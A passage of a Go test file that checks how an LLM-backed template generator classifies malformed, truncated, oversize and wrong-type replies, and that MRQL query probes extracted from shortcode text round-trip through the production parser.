	generator := application_context.NewTemplateGenerator(malformedProvider{}, application_context.TemplateGenerationConfig{APIKey: "k", Timeout: time.Second})
	result, err := disclosedGenerate(generator, application_context.TemplateGenerationInput{
		Target: application_context.TemplateTargetBundle, EntityType: "group", BundleSlots: []string{"CustomHeader", "CustomHeaderCSS"},
	}, "a template")
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Issues) == 0 {
		t.Fatalf("the generator reported no issue for a malformed bundle: %#v", result)
	}
	for _, issue := range result.Issues {
		if classifyIssue(issue) != classBundleDegraded {
			t.Fatalf("degrade message %q is not classified", issue.Message)
		}
	}
}

type fixedProvider string

func (p fixedProvider) Endpoint() string {
	return application_context.DefaultDeepSeekChatCompletionsURL
}

func (p fixedProvider) GenerateDraft(context.Context, application_context.TemplateDraftRequest) (application_context.TemplateDraftResponse, error) {
	return application_context.TemplateDraftResponse{Content: string(p), FinishReason: "stop"}, nil
}

type lengthProvider string

func (p lengthProvider) Endpoint() string {
	return application_context.DefaultDeepSeekChatCompletionsURL
}

func (p lengthProvider) GenerateDraft(context.Context, application_context.TemplateDraftRequest) (application_context.TemplateDraftResponse, error) {
	return application_context.TemplateDraftResponse{Content: string(p), FinishReason: "length"}, nil
}

// TestTruncationAndOversizeIssuesStayClassified drives the real generator into
// its truncation and oversize branches, so a rewording of either message fails
// here instead of zeroing the truncation count.
func TestTruncationAndOversizeIssuesStayClassified(t *testing.T) {
	in := application_context.TemplateGenerationInput{
		Target: application_context.TemplateTargetBundle, EntityType: "group", BundleSlots: []string{"CustomHeader", "CustomHeaderCSS"},
	}
	oversize, _ := json.Marshal(map[string]any{"slots": map[string]string{"CustomHeader": strings.Repeat("x", application_context.MaxTemplateGeneratedContentLength+1), "CustomHeaderCSS": ""}, "explanation": "e"})
	for name, tc := range map[string]struct {
		provider application_context.TemplateDraftProvider
		want     issueClass
	}{
		"truncated": {lengthProvider(""), classTruncated},
		"oversize":  {fixedProvider(oversize), classOversize},
	} {
		t.Run(name, func(t *testing.T) {
			generator := application_context.NewTemplateGenerator(tc.provider, application_context.TemplateGenerationConfig{APIKey: "k", Timeout: time.Second})
			result, err := disclosedGenerate(generator, in, "a header")
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, issue := range result.Issues {
				found = found || classifyIssue(issue) == tc.want
			}
			if !found {
				t.Fatalf("no issue classified %s in %#v", tc.want, result.Issues)
			}
			draft := Draft{Status: 200, Target: result.Target, Slots: result.Slots, Valid: result.Valid, Issues: result.Issues}
			got, _ := Score(pairCase(), draft, []Call{{FinishReason: "stop"}}, okPreview("<p>x</p>"), nil, testEnv())
			if !got.Truncated || got.LintErrors != 0 {
				t.Fatalf("truncated=%v lint=%d", got.Truncated, got.LintErrors)
			}
		})
	}
}

// TestWrongTypeExplanationDegradesInProductionAndScoresOnce drives the real
// generator: an explanation of the wrong type makes the whole reply fail to
// decode, which production reports with the degrade issue.
func TestWrongTypeExplanationDegradesInProductionAndScoresOnce(t *testing.T) {
	reply := `{"slots":{"CustomHeader":"hi","CustomHeaderCSS":""},"explanation":123}`
	generator := application_context.NewTemplateGenerator(fixedProvider(reply), application_context.TemplateGenerationConfig{APIKey: "k", Timeout: time.Second})
	result, err := disclosedGenerate(generator, application_context.TemplateGenerationInput{
		Target: application_context.TemplateTargetBundle, EntityType: "group", BundleSlots: []string{"CustomHeader", "CustomHeaderCSS"},
	}, "a header")
	if err != nil {
		t.Fatal(err)
	}
	draft := Draft{Status: 200, Target: result.Target, Slots: result.Slots, Valid: result.Valid, Issues: result.Issues}
	got, _ := Score(pairCase(), draft, []Call{{FinishReason: "stop", Content: reply}}, nil, nil, testEnv())
	if got.Malformed || !got.WrongShape {
		t.Fatalf("malformed=%v wrongShape=%v for production's result %#v", got.Malformed, got.WrongShape, result)
	}
}

func TestQueryProbesCarryWhatTheRuntimeReads(t *testing.T) {
	text := `[mrql query="type = note AND name = $n" param-n="x" limit="3" scope="global" format="table"]` +
		`[conditional mrql2='a = "b"' gt2="0" limit2="2" path="p" eq="v"]y[elseif mrql="c = 1" gt="0"]z[/conditional][mrql saved="s"]`
	got := QueryProbes("CustomHeader", text)
	want := []QueryProbe{
		{Slot: "CustomHeader", Query: "type = note AND name = $n", Snippet: `[mrql query="type = note AND name = $n" limit="3" param-n="x" scope="global"]`},
		{Slot: "CustomHeader", Query: `a = "b"`, Snippet: `[mrql query='a = "b"' limit="2"]`},
		{Slot: "CustomHeader", Query: "c = 1", Snippet: `[mrql query="c = 1"]`},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("probes = %#v\nwant %#v", got, want)
	}
}

func testEnv() Env {
	return Env{Known: shortcodes.KnownFromBuiltins(), ValidateMRQL: func(q string) error { _, err := mrql.Parse(q); return err }}
}

// TestQueryProbesRoundTripThroughTheParser checks that a probe hands the
// runtime the same attribute values as the draft: each probe is parsed back
// with the production parser and compared with the source token's attributes.
func TestQueryProbesRoundTripThroughTheParser(t *testing.T) {
	cases := []struct {
		text, query string
	}{
		{`[mrql query='type = note AND name = &quot;x&quot;']`, `type = note AND name = "x"`},
		{`[mrql query="type = note AND name = &quot;x&quot;"]`, `type = note AND name = `},
		{`[mrql query="name = 'x'"]`, `name = 'x'`},
		{`[mrql query='name = "x"']`, `name = "x"`},
		{`[mrql query="name = &amp;quot;x&amp;quot;" param-a='&lt;b&gt;']`, `name = &quot;x&quot;`},
		{`[conditional path="p" eq="v"]a[elseif mrql='tags = &quot;t&quot;' gt="0"]b[/conditional]`, `tags = "t"`},
		{`[lazy][mrql query="type = group" limit="2"][/lazy]`, `type = group`},
	}
	for _, c := range cases {
		probes := QueryProbes("CustomHeader", c.text)
		if len(probes) != 1 {
			t.Fatalf("%s: probes = %#v", c.text, probes)
		}
		p := probes[0]
		if p.Query != c.query {
			t.Errorf("%s: probe query %q, want %q", c.text, p.Query, c.query)
		}
		parsed := shortcodes.Parse(p.Snippet)
		if len(parsed) != 1 || parsed[0].Attrs["query"] != c.query {
			t.Errorf("%s: probe %s parses to %#v", c.text, p.Snippet, parsed)
		}
		if strings.Contains(c.text, "param-a") && parsed[0].Attrs["param-a"] != "<b>" {
			t.Errorf("%s: param did not round-trip: %#v", c.text, parsed[0].Attrs)
		}
	}
}

// disclosedGenerate runs a generation the way the handler does: a dry run for
// the disclosure, then the request carrying its groundingHash.
func disclosedGenerate(gen application_context.TemplateGenerator, in application_context.TemplateGenerationInput, prompt string) (*application_context.TemplateGenerationResult, error) {
	disclosure, err := gen.DiscloseTemplate(in, prompt)
	if err != nil {
		return nil, err
	}
	return gen.GenerateTemplate(context.Background(), in, prompt, disclosure.GroundingHash)
}
